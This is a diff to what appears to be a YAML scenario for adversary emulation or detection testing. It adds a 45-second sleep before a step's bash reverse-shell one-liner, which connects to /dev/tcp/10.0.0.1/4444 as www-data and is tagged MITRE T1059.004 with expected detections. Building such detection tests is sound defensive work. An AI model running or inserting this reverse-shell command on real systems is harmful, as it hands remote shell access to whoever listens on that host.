@@ -50,7 +50,10 @@ steps:
 
   - id: step-02
     name: "Reverse shell from the web server (prevented)"
-    command: "exec bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+    # The sleep gives the step a deliberate 45 s lifetime: Tier-D's kill injector
+    # needs a window in which the step's subshell exists. The reverse-shell
+    # command itself is unchanged.
+    command: "sleep 45; exec bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
     identity: www-data
     mitre_technique: "T1059.004"
     expected_detections:
